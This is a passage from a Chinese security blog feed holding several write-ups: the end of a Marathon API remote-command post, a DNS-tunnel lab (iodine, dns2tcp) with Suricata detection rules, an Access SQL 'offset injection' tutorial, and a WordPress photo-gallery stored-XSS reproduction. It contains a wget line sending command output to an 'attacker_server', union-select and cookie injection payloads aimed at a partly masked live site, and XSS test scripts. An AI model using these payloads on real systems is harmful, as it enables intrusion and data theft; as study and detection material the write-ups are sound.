&quot;/usr/bin/wget --user-agent=marathon-id --post-data=`id` attacker_server:55555&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><p>3、再打开<a href="https://xxx.xxx.xxx.xxx/ui/#/apps" target="_blank" rel="noopener">https://XXX.XXX.XXX.XXX/ui/#/apps</a> 的Marathon服务管理界面，可以看到其中已经包含了一个名为“rce-id”的实例，这就是我们刚刚用curl命令创建的。在我的自架服务器中，稍等一会，就能看到XXX.XXX.XXX.XXX响应回来的cmd命令输出结果：</p><p><a href="https://image.3001.net/images/20190909/1568008521_5d75e9498c093.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190909/1568008521_5d75e9498c093.png!small" alt="img"></a></p><p>PS：测试过后，为了不对目标应用系统造成安全影响，我及时从Marathon界面中删除了创建的“rce-id”实例。 整个过程中，就用到了netcat、curl命令和浏览器，另外，当然主要还是Shodan很给力了。</p><p><strong>*参考来源：omespino，clouds编译整理，转载请注明来自FreeBuf.COM</strong></p><p>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/kksunkanghui/article/details/90260122" target="_blank" rel="noopener">https://blog.csdn.net/kksunkanghui/article/details/90260122</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS隧道流量分析</title>
      <link href="/2019/10/01/DNS%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/01/DNS%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index> </excerpt></p><ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><strong>DNS协议又称域名系统是互联网的基础设施，只要上网就会用到，因而DNS协议是提供网络服务的重要协议，在黑客进入内网后会使用DNS、ICMP、HTTP等协议隧道隐藏通信流量。本文通过DNS隧道实验并对流量进行分析，识别DNS隧道流量特征。</strong></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>CentOS Linux 两台</p></blockquote><h2 id="创建DNS服务器"><a href="#创建DNS服务器" class="headerlink" title="创建DNS服务器"></a>创建DNS服务器</h2><h3 id="1-安装bind"><a href="#1-安装bind" class="headerlink" title="1.安装bind"></a>1.安装bind</h3><blockquote><p>yum install bind*</p></blockquote><h3 id="2-配置named文件"><a href="#2-配置named文件" class="headerlink" title="2.配置named文件"></a>2.配置named文件</h3><blockquote><p>修改/etc/named.conf</p></blockquote><p>将下图中选中的地方改为any</p><p><a href="https://image.3001.net/images/20190922/1569146633_5d874709c6d25.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146633_5d874709c6d25.png!small" alt="img"></a></p><h3 id="3-设置NS记录，A记录"><a href="#3-设置NS记录，A记录" class="headerlink" title="3. 设置NS记录，A记录"></a>3. 设置NS记录，A记录</h3><p>增加区域解析文件在/etc/named.rfc1912.zones增加区域解析记录文件</p><p><a href="https://image.3001.net/images/20190922/1569146676_5d8747341bd57.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146676_5d8747341bd57.png!small" alt="img"></a></p><p>增加正向解析记录</p><p>将/var/named/named.localhost改为上图中修改的名字</p><blockquote><p>cp /var/named/named.localhost/var/named/name.dnstunel</p></blockquote><p>修改文件如下</p><p>添加NS记录，A记录</p><p><a href="https://image.3001.net/images/20190922/1569146697_5d87474959091.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146697_5d87474959091.png!small" alt="img"></a></p><p>添加bind为自启动服务</p><blockquote><p>systemctl enablenamed.service</p><p>systemctl restartnamed.service</p></blockquote><p>查看启动状态</p><blockquote><p>systemctl statusnamed.service</p></blockquote><p><a href="https://image.3001.net/images/20190922/1569146764_5d87478c682a8.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146764_5d87478c682a8.png!small" alt="img"></a></p><p>将另一台主机DNS服务器设置为192.168.1.7，ping ns.dnstuneltest.com是否正确解析，(如果不能解析，可能跟防火墙有关系，在DNS服务器上执行iptables -F)</p><h2 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h2><p>Ionine支持两种模式，中继以及直连模式，服务器与客户端可以直接通信而不需要第三种辅助软件，通信的DNS数据损坏容易容易被发现。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载地址：</p><blockquote><p><a href="https://github.com/yarrick/iodine/archive/master.zip" target="_blank" rel="noopener">https://github.com/yarrick/iodine/archive/master.zip</a></p></blockquote><p>unzip 解压</p><p>cd iodine-master</p><p>make</p><p>出现报错</p><p><a href="https://image.3001.net/images/20190922/1569146786_5d8747a29613c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146786_5d8747a29613c.png!small" alt="img"></a></p><p>yum -y install zlib-devel</p><p>make;make install</p><p>安装完成</p><p>进入 bin</p><p>iodined 服务器</p><p>iodine 客户端</p><h3 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h3><p><strong>服务器</strong></p><blockquote><p>./iodined -f -c -P 123456 10.1.0.1ns.dnstuneltest.com</p><p>-f 前台显示，运行后一直在命令行等待</p><p>-c 中继模式|直连模式</p><p>-P 认证密码</p></blockquote><p>Ip 虚拟出网卡的IP，在隧道建立后，客户端同样会多出一块dns0网卡，与该IP在 同一网段，可以任意设置，虚拟IP。</p><p>设置的域名，这里要跟区域配置文件一致。</p><p>输入完成之后，ifconfig查看会多一块网卡</p><p><a href="https://image.3001.net/images/20190922/1569146826_5d8747ca4baf2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146826_5d8747ca4baf2.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20190922/1569146836_5d8747d4634f0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146836_5d8747d4634f0.png!small" alt="img"></a></p><p><strong>客户端</strong></p><blockquote><p>./iodine -f -P  123456 192.168.1.7 ns.dnstuneltest.com</p><p>-f 前台显示</p><p>-P 认证密码</p><p>IP 为配置DNS服务器IP或者为购买的云服务IP，输入此选项之后，直接与指定IP查询，而不经过其他DNS服务器层解析</p></blockquote><p>客户端此时也会新增一个网卡，DNS0，IP为10.1.0.2与服务器DNS0网卡处于同一网段中，此时服务器端与客户端可以使用这两个IP互相通信。</p><p><a href="https://image.3001.net/images/20190922/1569146926_5d87482ed5393.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146926_5d87482ed5393.png!small" alt="img"></a></p><h3 id="流量包分析"><a href="#流量包分析" class="headerlink" title="流量包分析"></a>流量包分析</h3><blockquote><p>抓包</p><p>tcpdump -i enp2s0 port 53 -w /tmp/iodine.pcap</p></blockquote><h2 id="建立链接的包分析"><a href="#建立链接的包分析" class="headerlink" title="建立链接的包分析"></a>建立链接的包分析</h2><p>在客户端启动后，会向服务器发送DNS请求包</p><p><a href="https://image.3001.net/images/20190922/1569146944_5d8748407376c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146944_5d8748407376c.png!small" alt="img"></a></p><p>客户端情报求包，请求包的type类型为10 (未知，可以作为检测的一种特征)，数据作为域名前缀</p><p>yrbh1o.ns.dnstuneltest.com, yrbh1o就是请求的数据</p><p><a href="https://image.3001.net/images/20190922/1569146956_5d87484c51cde.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146956_5d87484c51cde.png!small" alt="img"></a></p><p>服务器响应包，rdata字段携带数据，因为查询包没有指定查询类型，所以rdata字段没有长度限制(限制于UDP最大包长512字节)</p><p><a href="https://image.3001.net/images/20190922/1569146995_5d87487333165.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569146995_5d87487333165.png!small" alt="img"></a></p><p>采用中继模式，客户端会一直发送心跳包，保持链接（因为DNS服务器不会直接与客户端发起链接，所以客户端会一直想服务器发送数据包）但是DNS协议的字段格式已经损坏。</p><h2 id="通信流量包分析"><a href="#通信流量包分析" class="headerlink" title="通信流量包分析"></a>通信流量包分析</h2><p>通信过程的中的DNS协议格式已经损坏，wireshark已经无法正确分析</p><p><a href="https://image.3001.net/images/20190922/1569147012_5d874884b3e79.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147012_5d874884b3e79.png!small" alt="img"></a></p><p>正常DNS的数据包中的query字段的形式是所占字节-三级域名-所占字节-二级域名-所占字节-一级域名形式并且正常的query字段时只有再域名结束时才会出现00阶段。</p><p>05fanyi05baidu03com</p><p><a href="https://image.3001.net/images/20190922/1569147039_5d87489f2f448.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147039_5d87489f2f448.png!small" alt="img"></a></p><p>隧道中的流量明显不符合上文的query字段规定。由60 08开头。</p><p><a href="https://image.3001.net/images/20190922/1569147062_5d8748b6705ac.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147062_5d8748b6705ac.png!small" alt="img"></a></p><h2 id="suricata检测规则-并未测试，仅共参考"><a href="#suricata检测规则-并未测试，仅共参考" class="headerlink" title="suricata检测规则(并未测试，仅共参考)"></a>suricata检测规则(并未测试，仅共参考)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDP payload协议偏移40个字节处是否为00 0a并且频率达到5秒3次以上。    alert udp $HOME_NET any -&gt; any 53 (msg:&quot;dnstunnel-iodine-connect&quot;;content: &quot;|00 0a|&quot;;offset:40;depth:4;threshold: type limit, track by_src, count 3, seconds 5;classtype:dns;sid:2010000; rev:1;)    通信包，query字段60 08开头，并且后面跟的不是59个字母或者数字的组合，或者后面的字母不存在\x00同时频率在60s一百次以上。     alert udp $HOME_NET any -&gt; any 53 (msg:&quot;dnstunnel-iodine-traffic&quot;;dsize &gt; 100;content:&quot;|6008|&quot;;offset:12;pcre:    !&quot;/[\x60\x08][a-zA-Z0-9]&#123;59&#125;/&quot;;threshold: type limit,track by_src, count 100, seconds 60;classtype:dns; sid:2010001; rev:1;)    alert udp $HOME_NET any -&gt; any 53 (msg:&quot;dnstunnel-iodine-traffic&quot;;dsize &gt; 100;content:&quot;|6008|&quot;;offset:12;content:&quot;|00|&quot;;depth:    59;threshold: type limit, track by_src, count 100, seconds60;classtype:    dns; sid:2010002; rev:1;)</span><br></pre></td></tr></table></figure><h2 id="Dns2tcp"><a href="#Dns2tcp" class="headerlink" title="Dns2tcp"></a>Dns2tcp</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>需要与其他回连工具配合，或者写入反弹shell</p><p>下载链接</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/14SIxdiIWHKZDUz6lgn_Zag" target="_blank" rel="noopener">https://pan.baidu.com/s/14SIxdiIWHKZDUz6lgn_Zag</a></p></blockquote><p>提取码：t1rw</p><p>安装编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure    make;make install</span><br></pre></td></tr></table></figure><p>服务器端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server/dns2tcpd</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux:    client/dns2tcpc     windows:</span><br></pre></td></tr></table></figure><p>云盘直接下载windows版本，或者下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc.exe</span><br></pre></td></tr></table></figure><h3 id="实验测试-1"><a href="#实验测试-1" class="headerlink" title="实验测试"></a>实验测试</h3><p><strong>服务器端</strong></p><p>1.创建配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vim/etc/dns2.conf    Listen  = 192.168.1.6（Linux服务器的IP,服务器的IP）     port   = 53         (监听本机的端口)    user   =nobody         chroot  = /tmp           domain =.ns.dnstuneltest.com（上面配置NS记录的域名）     resources =ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128(设置本地监听的服务资源，根据自身服务开启的资源设置)</span><br></pre></td></tr></table></figure><p>2.启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dns2tcpd -f/etc/dns2.conf</span><br></pre></td></tr></table></figure><p>启动之后会将DNS的隧道流量根据客户端选择的资源使用对应的服务建立连接</p><p>出现如下错误需要关闭服务器自带的dns解析服务</p><p><a href="https://image.3001.net/images/20190922/1569147189_5d874935af0c1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147189_5d874935af0c1.png!small" alt="img"></a></p><p><strong>客户端</strong></p><blockquote><p>dns2tcpc -r ssh-z ns.dnstuneltest.com 192.168.1.6 -l 8888 -d 2</p><p>r:指定对应的资源，前面服务器需开启指定的资源</p><p>-z:自定解析的dns域名，如果域名已经添加的公网的DNS解析则可以省略后面的IP</p><p>-l:端口</p><p>-d:是否为调试模式 2 等级可以省略</p></blockquote><p><a href="https://image.3001.net/images/20190922/1569147208_5d874948a6625.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147208_5d874948a6625.png!small" alt="img"></a></p><p>客户端使用访问服务器</p><p><a href="https://image.3001.net/images/20190922/1569147224_5d874958c053f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147224_5d874958c053f.png!small" alt="img"></a></p><h3 id="流量包分析-1"><a href="#流量包分析-1" class="headerlink" title="流量包分析"></a>流量包分析</h3><p>建立链接并未产生通信包</p><p><a href="https://image.3001.net/images/20190922/1569147245_5d87496daba47.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147245_5d87496daba47.png!small" alt="img"></a></p><p>使用ssh访问时，才会产生数据包</p><p><a href="https://image.3001.net/images/20190922/1569147256_5d8749783700a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147256_5d8749783700a.png!small" alt="img"></a></p><p>数据包分析</p><p>需要时客户端会向服务端发起TXT类型请求，服务器的返回包也会放在回复的TXT记录中</p><p><a href="https://image.3001.net/images/20190922/1569147272_5d874988d0bef.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147272_5d874988d0bef.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20190922/1569147287_5d874997e61f1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190922/1569147287_5d874997e61f1.png!small" alt="img"></a></p><p>客户端通过TXT类型记录的域名前缀来发出数据，通过DNS RR中的TXT记录来附加回应的内容。域名前缀和回应内容均采用base64编码，如果提取单条数据，进行base64解码，即可看到传输的内容。从发包行为上可以发现，如果在进行传输数据这种大量数据交互操作的情况，dns2tcp会将数据切分成若干个小单元，依次发出，时间间隔非常小，而当无数据交互，空闲时，两端仍然通过发包维持通信状态。</p><h2 id="Suricata规则检测-并未测试，仅共参考"><a href="#Suricata规则检测-并未测试，仅共参考" class="headerlink" title="Suricata规则检测(并未测试，仅共参考)"></a>Suricata规则检测(并未测试，仅共参考)</h2><p>因为Dns2tcp采用的是标准的dns协议格式，所以只能通过发包的频率检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert udp $HOME_NET any -&gt; any 53(msg:&quot;dns tunnel-dns2tcp&quot;;content: &quot;|0010|&quot;;offset:40;depth:4; threshold: type limit, track by_src, count 150,seconds 10;classtype:dns; sid:2010003; rev:1;)</span><br></pre></td></tr></table></figure><p>结尾</p><p>小白水文，求大神放过</p><p>pcap包下载地址：</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1R9IhfxI285QMLGwjh_gQVw" target="_blank" rel="noopener">https://pan.baidu.com/s/1R9IhfxI285QMLGwjh_gQVw</a> </p></blockquote><p>提取码：n5ha </p><p>————————————————</p><p>原文链接：<a href="https://www.freebuf.com/articles/security-management/214923.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/security-management/214923.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Acccess偏移注入</title>
      <link href="/2019/10/01/Acccess%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5-1/"/>
      <url>/2019/10/01/Acccess%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><h1 id="认识偏移注入"><a href="#认识偏移注入" class="headerlink" title="认识偏移注入"></a><strong>认识偏移注入</strong></h1><p><strong>偏移注入的原理：</strong></p><p><strong>借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示！</strong></p><p><strong>偏移注入的用途：</strong></p><p><strong>解决知道Access数据库中知道表名，但是得不到字段的sql注入困境。</strong></p><p><strong>偏移注入的特点：</strong></p><p>A:成功与否看技巧与运气，不能保证100%成功。</p><p>B:无需管理员账号密码字段，直接爆账号密码</p><p><strong>偏移注入的利用条件：</strong></p><p>A：已知管理表名</p><p>B：已知任意字段（一个或多个会增加机率，最常见的就是id）</p><p><strong>影响偏移注入成功率的因素</strong></p><p>A:管理表的字段数越少越好（最好是三个:id  账号字段  密码字段）</p><p>B:当前注入点的脚本内查询的表内的字段数越多越好（最好有几十个，这样基本成功率是100%）</p><p><strong>C:已知的字段数越多越好（id一般存在）</strong></p><p><strong>偏移注入的流程：</strong></p><p>1、 判断字段数</p><p>2、 判断表名</p><p>3、 开始偏移注入</p><h1 id="偏移注入的实例演示"><a href="#偏移注入的实例演示" class="headerlink" title="偏移注入的实例演示"></a><strong>偏移注入的实例演示</strong></h1><p>注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://59.63.***.**:8004/ProductShow.asp?ID=105</span><br></pre></td></tr></table></figure><p><strong>注入点信息：</strong></p><p>字段数：26</p><p>管理表名：admin</p><p><strong>先直接联合查询爆显位</strong></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/Access01.png" alt="躲起来了"></p><p><strong>下面开始偏移注入</strong></p><h4 id="判断表内存在的字段数"><a href="#判断表内存在的字段数" class="headerlink" title="判断表内存在的字段数"></a><strong>判断表内存在的字段数</strong></h4><p><strong>我们利用“*”代替admin表内存在的字段，由于是26个字段数，需要逐步测试，直到返回正常。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,admin.* from admin  #错误</span><br><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,admin.* from admin  #正确`</span><br></pre></td></tr></table></figure><h4 id="爆出字段内容"><a href="#爆出字段内容" class="headerlink" title="爆出字段内容"></a><strong>爆出字段内容</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,admin.*,24,25,26 from admin  #错误</span><br><span class="line">union select 1,2,3,4,5,6,admin.*,23,24,25,26 from admin  #正确</span><br></pre></td></tr></table></figure><p><strong>利用js在cookie中注入一样</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;id=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,23,24,25,admin.*,26 from admin&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/Access02.png" alt="躲起来了"></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress插件中的XSS漏洞的复现分析与利用</title>
      <link href="/2019/09/26/WordPress%E6%8F%92%E4%BB%B6%E4%B8%AD%E7%9A%84XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/26/WordPress%E6%8F%92%E4%BB%B6%E4%B8%AD%E7%9A%84XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>WordPress起初是一款个人博客系统，后来逐步地演化成为一款内容管理系统软件。它使用PHP语言和MySQL数据库开发而成，用户可以在支持相应版本的PHP 和 MySQL数据库的服务器上方便快捷地搭建自己的博客或者网站。WordPress中的photo-gallery插件可以让用户在短短几分钟内构建十分漂亮精美的照片库。在photo-gallery&lt;=1.5.34的版本中存在存储型XSS漏洞，一旦被黑客利用，将会产生非常严重的后果，本文我们详细讨论该漏洞。</strong></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>1.渗透主机：kali-linux-2018.3-vm-i386</p><p>2.目标主机：Debian9.6 x64</p><p>3.软件版本：wordpress-5.2.2</p><p>4.插件版本：photo-gallery.1.5.34</p></blockquote><h2 id="涉及工具"><a href="#涉及工具" class="headerlink" title="涉及工具"></a>涉及工具</h2><blockquote><p>1.XAMPP for Linux 5.6.30</p><p>2.BeEF 0.4.7.0-alpha</p><p>3.Mozilla Firefox 60.6.2</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.在photo-gallery的Add Galleries/Images模块中新建一个名为Test的照片库，在Basic和Advanced中分别添加图片，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568730541_5d80edad89d7c.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568730541_5d80edad89d7c.png!small" alt="img"></a></p><p>2.设置Gallery title、Slug以及Description等条目的信息，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568730562_5d80edc21ec6a.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568730562_5d80edc21ec6a.png!small" alt="img"></a></p><p>3.选中图片进行编辑，在图片的Alt/Title文本框中输入如下脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在Description文本框中输入如下脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;World&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用于验证这两处是否存在XSS漏洞，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568730697_5d80ee4920562.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568730697_5d80ee4920562.png!small" alt="img"></a></p><p>4.点击Gallery中的save按钮保存照片库设置，然后点击Preview按钮，可以看到“Hello”弹窗，说明Alt/Title文本框存在XSS漏洞，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568730721_5d80ee61ac3f5.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568730721_5d80ee61ac3f5.png!small" alt="img"></a></p><p>5.在点击Gallery中的Preview按钮之后，再点击页面中的图片，可以看到“World”弹窗，说明Description文本框也存在XSS漏洞，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568730748_5d80ee7ce0a63.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568730748_5d80ee7ce0a63.png!small" alt="img"></a></p><p>由此我们可以确定，在插件photo-gallery的Add Galleries/Images模块中存在两处存储型XSS漏洞。只要用户点击了如下URL：</p><blockquote><p><a href="http://192.168.188.155/wordpress/bwg_gallery/testxss/" target="_blank" rel="noopener">http://192.168.188.155/wordpress/bwg_gallery/testxss/</a></p></blockquote><p>或者点击了该页面中的图片，就会遭受到XSS恶意脚本的攻击。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过分析源代码，我们找到了XSS漏洞的产生点，有关的问题源码具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$description = str_replace(array(&apos;\\&apos;, &apos;\t&apos;), &apos;&apos;, WDWLibrary::get(&apos;image_description_&apos; . $image_id, &apos;&apos;));</span><br><span class="line">$alt = str_replace(array(&apos;\\&apos;, &apos;\t&apos;), &apos;&apos;,  WDWLibrary::get(&apos;image_alt_text_&apos; . $image_id, &apos;&apos;, FALSE));</span><br><span class="line">$alt = esc_html(preg_replace(&quot;/]*&gt;|&lt;\/a&gt;/&quot;, &apos;&apos;, $alt));</span><br></pre></td></tr></table></figure><p>变量description和alt分别对应页面中的Description和Alt/Title区域。</p><p>类WDWLibrary的静态函数get和validate_data的具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public static function get($key, $default_value = &apos;&apos;, $esc_html = true) &#123;</span><br><span class="line">    if (isset($_GET[$key])) &#123;</span><br><span class="line">      $value = $_GET[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (isset($_POST[$key])) &#123;</span><br><span class="line">      $value = $_POST[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (isset($_REQUEST[$key])) &#123;</span><br><span class="line">      $value = $_REQUEST[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      $value = $default_value;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_array($value)) &#123;</span><br><span class="line">      array_walk_recursive($value, array(&apos;self&apos;, &apos;validate_data&apos;), $esc_html);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      self::validate_data($value, $esc_html);</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">  &#125;</span><br><span class="line">  private static function validate_data(&amp;$value, $esc_html) &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    if ($esc_html) &#123;</span><br><span class="line">      $value = esc_html($value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>$description在使用类WDWLibrary的静态函数get时，未给参数$esc_html赋值，那么$esc_html使用默认值true，即直接使用esc_html函数对从前端获取到的数据进行过滤消毒。$alt在使用类WDWLibrary的静态函数get时，给参数$esc_html赋值FALSE，即在get函数中不使用esc_html函数过滤消毒，而是先使用preg_replace函数进行正则表达式匹配，再使用esc_html函数进行过滤。</p><p>函数esc_html的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function esc_html( $text ) &#123;</span><br><span class="line">$safe_text = wp_check_invalid_utf8( $text );</span><br><span class="line">$safe_text = _wp_specialchars( $safe_text, ENT_QUOTES );</span><br><span class="line">return apply_filters( &apos;esc_html&apos;, $safe_text, $text );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在preg_replace函数中使用的正则表达式”/&lt;a[^&gt;]*&gt;|&lt;\/a&gt;/”无法匹配类似于的XSS测试脚本。</p><p>wp_check_invalid_utf8函数用于检查字符串中是否存在无效的utf8编码。</p><p>_wp_specialchars函数将一些特殊字符转换为其HTML实体，具体包含&amp;, &lt;, &gt;, “, and ‘.这些字符，但只是将这些特殊字符进行html编码存储，并没有将其过滤。</p><p>综上，过滤方法并未起作用，因此XSS脚本完整地保存在了MySQL数据库中，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568731044_5d80efa43494b.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568731044_5d80efa43494b.png!small" alt="img"></a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对版本号&lt;=1.5.34的模块中存在的XSS漏洞，建议及时将Photo-Gallery模块更新到1.5.35及以上版本。在1.5.35版本中，问题代码得到了修复，修复后的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$description = str_replace(array(&apos;\\&apos;, &apos;\t&apos;), &apos;&apos;, WDWLibrary::get(&apos;image_description_&apos; . $image_id, &apos;wp_filter_post_kses&apos;));</span><br><span class="line">$alt = str_replace(array(&apos;\\&apos;, &apos;\t&apos;), &apos;&apos;,  